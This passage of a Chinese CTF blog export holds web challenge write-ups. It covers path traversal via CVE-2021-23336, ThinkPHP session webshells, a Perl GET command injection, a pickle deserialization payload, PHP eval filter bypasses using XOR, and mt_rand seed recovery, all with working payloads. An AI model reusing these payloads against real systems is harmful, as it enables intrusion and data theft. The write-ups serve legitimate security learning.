&#123;&#125; memoList = [] try: clientId = getClientID(request.client.host) path = &#x27;./memo/&#x27; + clientId if os.path.exists(path): memoList = os.listdir(path) context[&#x27;request&#x27;] = request context[&#x27;ip&#x27;] = request.client.host context[&#x27;clientId&#x27;] = clientId context[&#x27;memoList&#x27;] = memoList context[&#x27;count&#x27;] = len(memoList) except: pass return templates.TemplateResponse(&#x27;/view/index.html&#x27;, context)def save(request): context = &#123;&#125; memoList = [] try: context[&#x27;request&#x27;] = request context[&#x27;ip&#x27;] = request.client.host contents = request.query_params[&#x27;contents&#x27;] path = &#x27;./memo/&#x27; + getClientID(request.client.host) + &#x27;/&#x27; if os.path.exists(path) == False: os.makedirs(path, exist_ok=True) memoList = os.listdir(path) idx = len(memoList) if idx &gt;= 3: return HTMLResponse(&#x27;Memo Full&#x27;) elif len(contents) &gt; 100: return HTMLResponse(&#x27;Contents Size Error (MAX:100)&#x27;) filename = str(idx) + &#x27;_&#x27; + datetime.datetime.now().strftime(&#x27;%Y%m%d%H%M%S&#x27;) f = open(path + filename, &#x27;w&#x27;) f.write(contents) f.close() except: pass return HTMLResponse(&#x27;Save Complete&#x27;)def reset(request): context = &#123;&#125; try: context[&#x27;request&#x27;] = request clientId = getClientID(request.client.host) path = &#x27;./memo/&#x27; + clientId if os.path.exists(path) == False: return HTMLResponse(&#x27;Memo Null&#x27;) shutil.rmtree(path) except: pass return HTMLResponse(&#x27;Reset Complete&#x27;)def view(request): context = &#123;&#125; try: context[&#x27;request&#x27;] = request clientId = getClientID(request.client.host) if &#x27;&amp;&#x27; in request.url.query or &#x27;.&#x27; in request.url.query or &#x27;.&#x27; in unquote(request.query_params[clientId]): raise filename = request.query_params[clientId] path = &#x27;./memo/&#x27; + &quot;&quot;.join(request.query_params.keys()) + &#x27;/&#x27; + filename f = open(path, &#x27;r&#x27;) contents = f.readlines() f.close() context[&#x27;filename&#x27;] = filename context[&#x27;contents&#x27;] = contents except: pass return templates.TemplateResponse(&#x27;/view/view.html&#x27;, context)def getClientID(ip): key = ip + &#x27;_&#x27; + os.getenv(&#x27;SALT&#x27;) return hashlib.md5(key.encode(&#x27;utf-8&#x27;)).hexdigest()routes = [ Route(&#x27;/&#x27;, endpoint=index), Route(&#x27;/view&#x27;, endpoint=view), Route(&#x27;/reset&#x27;, endpoint=reset), Route(&#x27;/save&#x27;, endpoint=save), Mount(&#x27;/static&#x27;, StaticFiles(directory=&#x27;./static&#x27;), name=&#x27;static&#x27;)]app = Starlette(debug=False, routes=routes)if __name__ == &quot;__main__&quot;: logging.info(&quot;Starting Starlette Server&quot;) uvicorn.run(app, host=&quot;0.0.0.0&quot;, port=11000) 四个路由分别对应了之前网页的四个功能，接下来最重要的是就是找rce或文件读取的点，发现在/view路由中存在文件读取： 123f = open(path, &#x27;r&#x27;)contents = f.readlines()f.close() 那么我们就要将path读到flag，那重点还是在这个/view路由中，分析函数，发现不能存在.和&amp;。不过由于题目的python是3.9.0的，因此存在CVE-2021-23336漏洞，这个CVE会把;當作&amp;。 这样的话，利用query_params的错误解析，当value以;分割后，query_params会截取;前半部分，而query_params.keys()会将key和a;后面的b,c当作key。 那么如果我们构建这样的payload： 1/view?id=flag;/.. request.url直接raw URL，沒有进行decode，然后request.url.query也是沒有decode，之后到了request.query_params的被解析成两个params: 12id=flag/..= 而最后在request.query_params.keys()的時候被decode，结合起来的path就变成了： 1./memo/id/../flag flag在./memo/flag这样就成功读取到了flag。 后来看了另一个大佬的wp，发现还有一个更神奇的操作可以构造path，利用到的是Host header，payload是这样构建的： 1#/view?id=flag&amp;/.. 这样payload传入后，request.url.query完全是空的，但是request.query_params依然存在，因此检查就被绕过，达到绕过的效果。 这种方法的原理大概就是，request.url是从Host header构造而来的，Host后如果加了个#，之后的部分都被当成fragment来解析，而不是 query string，所以request.url.query置空了。而request.query_params是直接拿最原始的query string，因此被保留了。 path构造出来仍是./memo/id/../flag，不过我在buu没有这个方法复现成功，可能是平台解析的问题。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"buu练习8","slug":"buu练习8","date":"2022-04-16T07:51:06.000Z","updated":"2022-04-16T11:55:04.613Z","comments":true,"path":"2022/04/16/buu练习8/","link":"","permalink":"http://example.com/2022/04/16/buu%E7%BB%83%E4%B9%A08/","excerpt":"前言 养好状态准备打MRCTF和ISCC，继续刷题","text":"前言 养好状态准备打MRCTF和ISCC，继续刷题 [GYCTF2020]EasyThinking根据题目判断本题要利用到ThinkingPHP的漏洞进行攻击，进入网页先随便进入个不存在的路由，获得版本为ThinkPHP V6.0.0。信息搜集发现存在www.zip源码泄露。 接着去找对应版本的漏洞，发现一个反序列化漏洞和任意文件操作漏洞，通过对比源码以及版本判断本题应该是任意文件操作漏洞，参考文章：ThinkPHP6任意文件操作漏洞的示例分析 我们翻阅vendor/topthink/framework/src/think/session/driver/File.php，发现文件驱动部分代码： 123456789101112public function __construct(App $app, array $config = [])&#123; $this-&gt;config = array_merge($this-&gt;config, $config); if (empty($this-&gt;config[&#x27;path&#x27;])) &#123; $this-&gt;config[&#x27;path&#x27;] = $app-&gt;getRootPath() . &#x27;runtime&#x27; . DIRECTORY_SEPARATOR . &#x27;session&#x27; . DIRECTORY_SEPARATOR; &#125; elseif (substr($this-&gt;config[&#x27;path&#x27;], -1) != DIRECTORY_SEPARATOR) &#123; $this-&gt;config[&#x27;path&#x27;] .= DIRECTORY_SEPARATOR; &#125; $this-&gt;init();&#125; 文件保存在/runtime/session中。接下来审计各个路由的功能，发现app/home/controller/Member.php中存在的search函数： 123456789101112131415161718192021222324252627282930public function search() &#123; if (Request::isPost())&#123; if (!session(&#x27;?UID&#x27;)) &#123; return redirect(&#x27;/home/member/login&#x27;); &#125; $data = input(&quot;post.&quot;); $record = session(&quot;Record&quot;); if (!session(&quot;Record&quot;)) &#123; session(&quot;Record&quot;,$data[&quot;key&quot;]); &#125; else &#123; $recordArr = explode(&quot;,&quot;,$record); $recordLen = sizeof($recordArr); if ($recordLen &gt;= 3)&#123; array_shift($recordArr); session(&quot;Record&quot;,implode(&quot;,&quot;,$recordArr) . &quot;,&quot; . $data[&quot;key&quot;]); return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]); &#125; &#125; session(&quot;Record&quot;,$record . &quot;,&quot; . $data[&quot;key&quot;]); return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]); &#125;else&#123; return View(&quot;search&quot;); &#125; &#125; search函数会把搜索框POST数据存到session文件里面，生成的session文件名规则即为sess_PHPSESSID。 接下来我们注册账号并登录，在搜索时进行抓包，写入一句马，将PHPSESSID改为32位的php文件名，key值为写入内容： 查看runtime/session/sess_1234567890123456789012345678.php，发现写入成功，查看disable_functions，命令执行函数被禁用。 那么我们先再写入一个一句马，接着去github上下载一个exploit.php这个poc，将11行改为pwn(/readflag)，上传到/var/tmp中。接着用上面的方法继续写入文件使得这个poc被包含：key=&lt;?php include(&#39;/var/tmp/exploit.php&#39;);?&gt; 最后返回sess_1234567890123456789012345678.php，获得flag。 [FireshellCTF2020]Caas进入网页，发现要我们输入内容进行编译，那么我们先随便输入点php代码，发现他不能识别这个代码，那么这就不是php编译器，那么我们进行各种尝试。 最后发现c语言成功编译，并且生成了ELF文件，并且成功输出了hello world。啊这不是web题吗，为啥使用的是c语言啊，难不成我还得去利用c的漏洞？ 尝试调用shell读取flag，无果，那么尝试文件包含： 1#include &quot;/etc/passwd&quot; 发现文件成功读取，那么我们读取/flag，成功得到flag。 [WMCTF2020]Make PHP Great Again审计代码 123456&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123; require_once $_GET[&#x27;file&#x27;];&#125; 这题的代码很眼熟，就感觉我在哪里见过类似的，后来翻了翻我最近的记录，发现这不是p牛去年写的使用多级软连接绕过文件判断吗，我们就用这个方法来绕过。 简单介绍下这个trick，就是正常情况下php会将用户输入的文件名进行resolve，转化成绝对路径，这时../、./都会进行计算，但如果软连接跳转次数达到一个上限，那么linux的lstat函数就会出错，导致php计算出的绝对路径和原始路径不同，从而绕过require_once。 linux下最常用的软连接就是/proc/self/root，这个路径指向根目录，因此我们构建payload： 1?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php 解码base64得到flag。 [HITCON 2017]SSRFme审计源码： 12345678910111213141516171819&lt;?php if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]); $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0]; &#125; echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); $info = pathinfo($_GET[&quot;filename&quot;]); $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); 首先代码创建了个sandbox文件夹，路径为sandbox/加上MD5加密过后的orange加页面输出的ip。 接着是关键部分，我们首先要了解peal函数中get命令漏洞： perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠 |）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。 那么我们就可以在url参数中传入读取flag的命令，然后写进文件中，我们在打开这个文件就可以获取flag了。 payload： 1?url=/&amp;filename=a 查看在根目下的文件，发现readflag文件，因此使用bash命令执行readflag。我们需要先创建一个与我们需要执行命令相同的文件，然后使用管道截获该流程，使之为命令的执行，这里要创建一模一样的文件： 1?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| 最后修改存储的文件，并读取flag输入到存储的文件中去，读取flag： 1?url=file:bash -c /readflag|&amp;filename=mrl64 [CISCN2019 华北赛区 Day1 Web2]ikun进入网页告诉我们要买到lv6爆破B站，宣告ikun主权，太爱了。然后注册账号登录，发现自己有1000元，好结果找了商店找了十页都没找到lv6，太爱了。 直接写脚本找lv6： 12345678910111213import requestsimport timeurl = &quot;http://47a66447-4bfa-417f-9165-0bccf73f8701.node4.buuoj.cn:81/shop&quot;params = &#123;&quot;page&quot;: &quot;&quot;&#125;flag= &quot;&quot;for i in range(1, 500): params[&quot;page&quot;] = i r = requests.get(url, params=params) time.sleep(1)//buu访问限制 if &quot;lv6.png&quot; in r.text: print(i) break 最后找到在181页，兴冲冲进去发现怎么价格这么臭啊(bushi，1145141919元根本买不起，怀疑存在逻辑漏洞，前端更改相关参数，发现更改折扣后不是回显操作失败，而是只允许管理员访问。 没有发现登录漏洞，储存中发现JWT，应该是更改jwt，更改username为admin后发现依然无法购买成功，那应该是存在密钥的，使用c-jwt-cracker工具进行爆破，爆出私钥为1Kun。 更改jwt后成功买到6级号，但是还要我们成为大会员，麻了怎么还有，当ikun好累。点击按钮发现没用，查看源码发现存在/static/asd1f654e683wq/www.zip，下载源码。 Admin.py： 1234567891011121314151617181920212223import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == &quot;admin&quot;: return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0) else: return self.render(&#x27;no_ass.html&#x27;) @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument(&#x27;become&#x27;) p = pickle.loads(urllib.unquote(become)) return self.render(&#x27;form.html&#x27;, res=p, member=1) except: return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0) 好家伙看到tornado本来以为是模板注入，后来发现这里是pickle反序列化漏洞。参考文章：Python Pickle反序列化漏洞 之后应该也会写一个pickle反序列化的博客。 那么根据文章内容，我们构造poc： 12345678910import pickleimport urllibimport commandsclass payload(object): def __reduce__(self): return (commands.getoutput,(&#x27;cat /flag.txt&#x27;,))a = payload()print urllib.quote(pickle.dumps(a)) 最后抓包并将payload传值给become即可获取flag】。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"buu练习7","slug":"buu练习7","date":"2022-04-14T07:11:52.000Z","updated":"2022-04-14T12:33:47.133Z","comments":true,"path":"2022/04/14/buu练习7/","link":"","permalink":"http://example.com/2022/04/14/buu%E7%BB%83%E4%B9%A07/","excerpt":"前言好久没刷buu了，继续刷","text":"前言好久没刷buu了，继续刷 [CISCN 2019 初赛]Love Math审计代码： 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; 这题要我们只使用白名单中的数学函数来进行rce，我们发现存在黑白名单，但是翻阅题目给我们的文档，我们发现以下三个函数： base_convert()：在任意进制之间转换数字 dechex()：把十进制转换为十六进制 hex2bin()：把十六进制值的字符串转换为ASCII字符 白名单中不存在hex2bin()，那么我们用另外的函数构建： 12base_convert(37907361743,10,36)//hex2bin 这三个函数相互利用就可以表示出所有的字符了，接下来我们看执行部分： 1eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;); 我们肯定想要构造这样的payload： 1eval(&#x27;echo&#x27;.$_GET[a]($_GET[b])&amp;a=system&amp;b=cat /flag.&#x27;;&#x27;); 那么我们就可以构造出_GET： 1base_convert(37907361743,10,36)(dechex(1598506324)) 接着利用变量覆盖构造payload绕过检测，获取flag： 1?c=$log=base_convert(37907361743,10,36)(dechex(1598506324));$$log&#123;pi&#125;($$log&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag 由于长度限制导致这题基本不可能用异或来绕过，只能说是一种思路吧。 [MRCTF2020]Ezaudit发现存在www.zip泄露，查看源码index.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php header(&#x27;Content-type:text/html; charset=utf-8&#x27;);error_reporting(0);if(isset($_POST[&#x27;login&#x27;]))&#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $Private_key = $_POST[&#x27;Private_key&#x27;]; if (($username == &#x27;&#x27;) || ($password == &#x27;&#x27;) ||($Private_key == &#x27;&#x27;)) &#123; // 若为空,视为未填写,提示错误,并3秒后返回登录界面 header(&#x27;refresh:2; url=login.html&#x27;); echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;; exit;&#125; else if($Private_key != &#x27;*************&#x27; ) &#123; header(&#x27;refresh:2; url=login.html&#x27;); echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;; exit; &#125; else&#123; if($Private_key === &#x27;************&#x27;)&#123; $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;; $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;test&quot;,$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result))&#123; echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;; &#125; &#125; &#125;&#125; // genarate public_key function public_key($length = 16) &#123; $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $public_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $private_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key = public_key(); //$Public_key = KVQP0LdJKRaV3n9D how to get crispr&#x27;s private_key??? 审计代码发现需要账号密码以及密钥，不过通过观察sql语句我们发现可以使用万能密码绕过： 11&#x27;or&#x27;1&#x27;=&#x27;1 因此最重要的部分就在于获取密钥了。我们发现在生成公钥与私钥的过程中使用的是mt_rand()伪随机。 首先算出伪随机值，exp： 12345678910s = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;key = &#x27;KVQP0LdJKRaV3n9D&#x27;m = &#x27;&#x27;for i in key: for j in range(len(s)): if i == s[j]: m += &quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;.format(j,j,len(s)-1)print(m)//36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 使用php_mt_seed工具计算种子，得到seed=1775196155，php版本5.2.1-7.0，因此在版本范围内指定seedmt_srand(1775196155);，再执行程序获取私钥为KVQP0LdJKRaV。 最后登录得到flag。 这题和[GWCTF 2019]枯燥的抽奖差不多，因此抽奖这题就不写了。 [GXYCTF2019]StrongestMind算1000个式子就可以获取flag，考python的exp编写： 12345678910111213141516171819202122232425import reimport requestsfrom time import sleepdef count(): s = requests.session() url = &#x27;http://631df4ea-649b-4f91-aff7-fef637d6fc0b.node4.buuoj.cn:81/&#x27; match = re.compile(r&quot;[0-9]+ [+|-] [0-9]+&quot;) r = s.get(url) for i in range(1001): sleep(0.1) str = match.findall(r.text)[0] # print(eval(str)) data = &#123;&quot;answer&quot; : eval(str)&#125; r = s.post(url, data=data) r.encoding = &quot;utf-8&quot; print(&#x27;&#123;&#125; : &#123;&#125;&#x27;.format(i,eval(str))) # print(r.text) print(r.text)if __name__ == &#x27;__main__&#x27;: count() 这里主要学习了python关于正则表达式的库——re的利用。整个代码的逻辑其实很简单，正则匹配网页内容中的加减算式，并将算式当成命令直接执行可以得到结果，最后post回去得到下一关的式子，循环1000次得到flag。这样想想之前hgame2022 week1的web那题应该也是差不多的。 [ISITDTU 2019]EasyPHPRCE题，审计源码： 123456789101112&lt;?phphighlight_file(__FILE__);$_ = @$_GET[&#x27;_&#x27;];if ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $_) ) die(&#x27;rosé will not do it&#x27;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die(&#x27;you are so close, omg&#x27;);eval($_);?&gt; 问题很简单，绕过两个if的过滤就可以了，第一个if很明显是个正则匹配的黑名单，而第二个if起到的作用是限制我们使用字符的数量，也就是在整个payload中我们只能使用12个字符。 取反绕过，查看phpinfo： 1?_=(~%8f%97%8f%96%91%99%90)(); 然后查看disable_functions： 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open, 噩耗啊这是，基本shell都被禁用了，不过我们永远滴神print_r(scandir(.))还在，我们还有希望。 但是取反的时候我们发现第二个if的条件无法被满足，第二个噩耗传来了属于是，不过没有关系，我们发现异或也没有被过滤，而且取反我们也可以使用^(%FF%FF%FF%FF%FF%FF%FF)进行替代，那么我们就可以构造payload了： 1?_=((%8F%9E%96%9C%9C%A0%9E)^(%FF%9C%FF%9B%9B%FF%9C)^(%FF%8F%FF%96%8C%FF%8F)^(%FF%FF%FF%FF%FF%FF%FF))(((%8C%9C%9E%9C%9B%96%9E)^(%FF%FF%FF%9B%FF%FF%9C)^(%FF%FF%FF%96%FF%FF%8F)^(%FF%FF%FF%FF%FF%FF%FF))((%D1)^(%FF))); 获取到文件，用readfile()来读取，但是这个文件名超级长，我们几乎不可能在异或这个文件名的情况下满足第二个if，因此这里要利用flag文件在最后的这一点，使用end()来读取，payload： 123readfile(end(scandir(.)))?_=((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF))); [SUCTF 2018]GetShell进入网页，发现是upload，同时给出了部分代码： 12345678if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123; $data=substr($contents,5); foreach ($black_char as $b) &#123; if (stripos($data, $b) !== false)&#123; die(&quot;illegal char&quot;); &#125; &#125; &#125; 这串代码对我们上传的文件的内容进行了过滤，测试发现基本上不能存在字母，利用之前讲过的无字符webshell，由于不能有引号，因此要改写下shell： 1234567&lt;?=$__=[];$____=$__==$__;$_=~(北)[$____];$_.=~(熙)[$____];$_.=~(北)[$____];$_.=~(拾)[$____];$_.=~(的)[$____];$_.=~(和)[$____];$___=~(样)[$____];$___.=~(说)[$____];$___.=~(小)[$____];$___.=~(次)[$____];$___.=~(站)[$____];$____=~(瞰)[$____];$_($$___[$_]);//system($_POST[system]); 上传文件后就可以执行rce了。看了别人的wp发现由于环境配置问题flag没写进文件，因此查看环境变量env获取flag。 [N1CTF 2018]eating_cms进入网页发现登录，扫描目录发现register.php，注册后登录。 进入网页发现url有个page参数，估计是伪协议，尝试读取源代码： 1?page=php://filter/convert.base64-encode/resource=user 成功： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phprequire_once(&quot;function.php&quot;);if( !isset( $_SESSION[&#x27;user&#x27;] ))&#123; Header(&quot;Location: index.php&quot;);&#125;if($_SESSION[&#x27;isadmin&#x27;] === &#x27;1&#x27;)&#123; $oper_you_can_do = $OPERATE_admin;&#125;else&#123; $oper_you_can_do = $OPERATE;&#125;//die($_SESSION[&#x27;isadmin&#x27;]);if($_SESSION[&#x27;isadmin&#x27;] === &#x27;1&#x27;)&#123; if(!isset($_GET[&#x27;page&#x27;]) || $_GET[&#x27;page&#x27;] === &#x27;&#x27;)&#123; $page = &#x27;info&#x27;; &#125;else &#123; $page = $_GET[&#x27;page&#x27;]; &#125;&#125;else&#123; if(!isset($_GET[&#x27;page&#x27;])|| $_GET[&#x27;page&#x27;] === &#x27;&#x27;)&#123; $page = &#x27;guest&#x27;; &#125;else &#123; $page = $_GET[&#x27;page&#x27;]; if($page === &#x27;info&#x27;) &#123;// echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;); Header(&quot;Location: user.php?page=guest&quot;); &#125; &#125;&#125;filter_directory();//if(!in_array($page,$oper_you_can_do))&#123;// $page = &#x27;info&#x27;;//&#125;include &quot;$page.php&quot;;?&gt; 要管理员权限才能读取信息，没看出什么，继续读取function： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129&lt;?phpsession_start();require_once &quot;config.php&quot;;function Hacker()&#123; Header(&quot;Location: hacker.php&quot;); die();&#125;function filter_directory()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function filter_directory_guest()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function Filter($string)&#123; global $mysqli; $blacklist = &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;; $whitelist = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;; for ($i = 0; $i &lt; strlen($string); $i++) &#123; if (strpos(&quot;$whitelist&quot;, $string[$i]) === false) &#123; Hacker(); &#125; &#125; if (preg_match(&quot;/$blacklist/is&quot;, $string)) &#123; Hacker(); &#125; if (is_string($string)) &#123; return $mysqli-&gt;real_escape_string($string); &#125; else &#123; return &quot;&quot;; &#125;&#125;function sql_query($sql_query)&#123; global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;&#125;function login($user, $pass)&#123; $user = Filter($user); $pass = md5($pass); $sql = &quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;$user&#x27; and `password_which_you_do_not_know_too` = &#x27;$pass&#x27;&quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die(); if ($res-&gt;num_rows) &#123; $data = $res-&gt;fetch_array(); $_SESSION[&#x27;user&#x27;] = $data[username_which_you_do_not_know]; $_SESSION[&#x27;login&#x27;] = 1; $_SESSION[&#x27;isadmin&#x27;] = $data[isadmin_which_you_do_not_know_too_too]; return true; &#125; else &#123; return false; &#125; return;&#125;function updateadmin($level,$user)&#123; $sql = &quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;$level&#x27; where `username_which_you_do_not_know`=&#x27;$user&#x27; &quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die();// die($res); if ($res == 1) &#123; return true; &#125; else &#123; return false; &#125; return;&#125;function register($user, $pass)&#123; global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = &quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES 